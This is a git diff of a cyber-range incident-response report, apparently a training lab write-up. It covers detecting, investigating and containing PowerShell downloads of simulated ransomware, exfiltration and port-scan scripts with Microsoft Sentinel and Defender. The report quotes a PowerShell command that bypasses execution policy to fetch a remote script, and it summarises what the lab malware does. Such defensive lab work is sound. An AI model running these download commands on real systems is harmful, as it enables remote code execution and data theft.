@@ -13,11 +13,6 @@ Sometimes when a bad actor has access to a system, they will attempt to download
 
 When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 
 
-### High-Level TOR-Related IoC Discovery Plan
-
-- **Check `DeviceFileEvents`** for any `tor(.exe)` or `firefox(.exe)` file events.
-- **Check `DeviceProcessEvents`** for any signs of installation or usage.
-- **Check `DeviceNetworkEvents`** for any signs of outgoing connections over known TOR ports.
 
 ---
 
@@ -31,13 +26,7 @@ Sentinel → Analytics → Schedule Query Rule
 
 **Query used to locate events:**
 
-```kql
-DeviceProcessEvents
-|where DeviceName == "windows-target-1"
-|where FileName == "powershell.exe"
-| where ProcessCommandLine contains "Invoke-WebRequest"
-| project TimeGenerated, AccountName, AccountSid, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine
-```
+
 <img width="858" height="176" alt="Invoke-WebRequest-Rule" src="https://github.com/user-attachments/assets/03c7084d-41bb-4bde-bc39-1da5ad83bc81" />
 
 ---
@@ -54,12 +43,14 @@ Next I worked the incident to completion, in accordance with the NIST 800-61: In
 ### Preparation
 - Document roles, responsibilities, and procedures.
 Ensure tools, systems, and training are in place.
-**Preparation phase already in place, assuming the company has already done this.**
+
+(Preparation phase already in place, assuming the company already has enviornment stood up etc.)
 
 ### Detection and Analysis
 - Identify and validate the incident.
 - Investigate the Incident by Actions → Investigate 
 - Gather relevant evidence and assess impact.
+
 Upon investigating the triggered incident "DH - Suspicious PowerShell Web Request"
 
 It was discovered that the following commands were run on the machine:
@@ -72,120 +63,76 @@ It was discovered that the following commands were run on the machine:
 
 `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`
 
+---
 
+After investigating the logs, I created another query to determine wether the downloaded files were executed. 
 …
-Check to make sure none of the downloaded scripts were actually executed
-
-**Query used to locate event:**
-
-```kql
-
-DeviceProcessEvents  
-| where DeviceName == "dh-test-vuln"  
-| where ProcessCommandLine contains "tor-browser-windows-x86_64-portable-14.5.8.exe"  
-| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
-```
-<img width="1333" height="439" alt="image" src="https://github.com/user-attachments/assets/97f846a0-8727-4e9d-9763-5109ec641986" />
-
----
-
-### 3. Searched the `DeviceProcessEvents` Table for TOR Browser Execution
-
-Searched for any indication that user "dh" actually opened the TOR browser. There was evidence that they did open it at `2025-10-22T17:29:48.0836423Z`. There were several other instances of `firefox.exe` (TOR) as well as `tor.exe` spawned afterwards.
 
 **Query used to locate events:**
 
 ```kql
+
+let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); 
 DeviceProcessEvents
-|where DeviceName == "dh-test-vuln"
-| where InitiatingProcessAccountName == "dh"
-| where FileName has_any ("tor.exe", "firefox.exe", "tor-browser.exe")
-| where Timestamp >= datetime(2025-10-22T17:01:41.5417889Z)
-| order by Timestamp desc
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountName, ProcessCommandLine
+| where TimeGenerated >= todatetime('2025-10-25T08:48:53.3638496Z')
+| where DeviceName == "windows-target-1"
+| where FileName == "powershell.exe"
+| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
+| order by TimeGenerated
+| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
+
 ```
-<img width="1324" height="493" alt="image" src="https://github.com/user-attachments/assets/f9f92ba1-1a68-418f-bd35-98e11dfd4c63" />
-
-
-
----
-
-### 4. Searched the `DeviceNetworkEvents` Table for TOR Network Connections
-
-Searched for any indication the TOR browser was used to establish a connection using any of the known TOR ports. At `2025-10-22T17:30:05.2782042Z`, an employee on the "threat-hunt-lab" device successfully established a connection to the remote IP address `185.219.84.166` on port `9001`. The connection was initiated by the process `tor.exe`, located in the folder `c:\users\dh\desktop\tor browser\browser\torbrowser\tor\tor.exe`. There were a couple of other connections to sites over port `443`.
-
-**Query used to locate events:**
-
-```kql
-DeviceNetworkEvents
-| where InitiatingProcessFileName  has_any ("tor.exe", "firefox.exe")
-| where DeviceName == "dh-test-vuln"
-| where RemotePort in ("9030", "9001", "9040", "9050", "9051", "9150", "80", "443")
-| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFolderPath
-| order by Timestamp desc
-```
-<img width="1340" height="439" alt="image" src="https://github.com/user-attachments/assets/029e2173-92f4-4e29-9857-8e5b3ffa2170" />
+<img width="849" height="205" alt="executedscripts" src="https://github.com/user-attachments/assets/37e769cd-f605-43ab-8715-17ef360264c8" />
 
 
 ---
 
-## Chronological Event Timeline 
+### Containment, Eradication, and Recovery
 
-### 1. File Download - TOR Installer
+Since it was determined these potentially malicious files were donwloaded and executed, to prevent further damage/infection to the network I isolated the device "windows-target-1" using Microsoft Defender for Endpoint and ran an Anti-Virus scan of the device. 
 
-- **Timestamp:** `2025-10-22T17:01:41.5417889Z`
-- **Event:** The user "dh" downloaded a file named `tor-browser-windows-x86_64-portable-14.5.8.exe` to the Downloads folder.
-- **Action:** File download detected.
-- **File Path:** `C:\Users\DH\Downloads\tor-browser-windows-x86_64-portable-14.5.8.exe`
+<img width="326" height="524" alt="image" src="https://github.com/user-attachments/assets/f6c117ba-5315-4e14-8353-608d473335fe" />
 
-### 2. Process Execution - TOR Browser Installation
+After analyzing all the scripts, I determined they were used to download and execute other powershell scripts from the internet to the C:\programdata folder on the device "windows-target-1"
 
-- **Timestamp:** `2025-10-22T17:28:59.1193171Z`
-- **Event:** The user "employee" executed the file `tor-browser-windows-x86_64-portable-14.5.8.exe` in silent mode, initiating a background installation of the TOR Browser.
-- **Action:** Process creation detected.
-- **Command:** `tor-browser-windows-x86_64-portable-14.5.8.exe /S`
-- **File Path:** `C:\Users\DH\Downloads\tor-browser-windows-x86_64-portable-14.5.8.exe`
+Passed the scripts to a malware analysis team to reverse engineer the malware and here are the results
+- Script ending in "eicar.ps1" was observed to create an EICAR test file, a standard for testing anitvirus solution, and logs the proccess.
+- Script ending in "exfiltratedata.ps1" was observed to generate fake employee data, compress into a ZIP file, and upload it to an Azure Blob storage container
+- Script ending in "pwncrypt.ps1" was observed to encypt files in a selected user's desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions. 
+- Script ending in "portscan.ps1" was observed to scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
+  
+While the machine was isolated and the antivirus scan was run, it removed the malware from the device. 
+Next, I verified the files were actually gone and the computer was back to a normal running state before releasing the device from isolation. 
 
-### 3. Process Execution - TOR Browser Launch
+### Post-Incident Activities
 
-- **Timestamp:** `2025-10-22T17:29:53.7615676Z`
-- **Event:** User "dh" opened the TOR browser. Subsequent processes associated with TOR browser, such as `firefox.exe` and `tor.exe`, were also created, indicating that the browser launched successfully.
-- **Action:** Process creation of TOR browser-related executables detected.
-- **File Path:** `C:\Users\DH\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`
+### **Findings**
 
-### 4. Network Connection - TOR Network
+* PowerShell was used to download four suspicious scripts (`pwncrypt.ps1`, `exfiltratedata.ps1`, `portscan.ps1`, `eicar.ps1`) from GitHub to `C:\ProgramData\`.
+* Scripts simulated ransomware, data exfiltration, port scanning, and AV test activity.
+* Alerts from Microsoft Sentinel and Defender correctly detected and contained the incident.
+* The affected device was isolated, scanned, and cleared of malicious files.
 
-- **Timestamp:** `2025-10-22T17:30:05.2782042Z`
-- **Event:** A network connection to IP `185.219.84.166` on port `9001` by user "employee" was established using `tor.exe`, confirming TOR browser network activity.
-- **Action:** Connection success.
-- **Process:** `tor.exe`
-- **File Path:** `c:\users\DH\desktop\tor browser\browser\torbrowser\tor\tor.exe`
+### **Lessons Learned**
 
-### 5. Additional Network Connections - TOR Browser Activity
+This incident highlights that misuse of legitimate administrative tools like PowerShell remains a major attack vector. Sentinel’s detection rules proved effective, demonstrating the value of continuous monitoring and well-defined alert logic. However, response time could be improved through greater automation, such as automatically isolating compromised devices. Additionally, PowerShell execution policies and user permissions were found to be too permissive, underscoring the need for stricter controls and least-privilege enforcement. Furthermore, instead of running removing the threat using antivirus, anohter option is to re-image "windows-target-1" which will restore it to a normal operating state before the malware was downloaded, if the organization permits it. Finally, the event reinforced the importance of ongoing user awareness training on script-based threats and phishing tactics that can deliver malicious PowerShell payloads.
 
-- **Timestamps:**
-  - `2025-10-22T17:30:01.1475237Z` - Connected to `162.55.48.243` on port `443`.
-  - `2025-10-22T17:30:15.7604651Z` - Local connection to `127.0.0.1` on port `9150`.
-- **Event:** Additional TOR network connections were established, indicating ongoing activity by user "dh" through the TOR browser.
-- **Action:** Multiple successful connections detected.
 
-### 6. File Creation - TOR Shopping List
+### **Policy & Tool Updates**
 
-- **Timestamp:** `2025-10-22T18:50:29.60246Z`
-- **Event:** The user "employee" created a file named `tor-shopping-list.txt` on the desktop, potentially indicating a list or notes related to their TOR browser activities.
-- **Action:** File creation detected.
-- **File Path:** `C:\Users\DH\Desktop\tor-shopping-list.txt`
+* Restrict PowerShell to admins and signed scripts only.
+* Deploy Defender ASR rules to block untrusted downloads.
+* Automate device isolation in Sentinel for high-severity alerts.
+* Add user awareness training on script-based threats.
+
+### **Documentation**
+
+* Incident “DH – Suspicious PowerShell Web Request” recorded with full logs, evidence, and analysis.
+* Root cause: misuse of PowerShell to fetch and execute malicious content.
+* Status: **Closed** — system restored, controls strengthened, and policies updated.
 
 ---
 
-## Summary
 
-The user "dh" on the "dh-test-vuln" device initiated and completed the installation of the TOR browser. They proceeded to launch the browser, establish connections within the TOR network, and created various files related to TOR on their desktop, including a file named `tor-shopping-list.txt`. This sequence of activities indicates that the user actively installed, configured, and used the TOR browser, likely for anonymous browsing purposes, with possible documentation in the form of the "shopping list" file.
-
----
-
-## Response Taken
-
-TOR usage was confirmed on the endpoint `dh-test-vuln` by the user `dh`. The device was isolated, and the user's direct manager was notified.
 
 ---
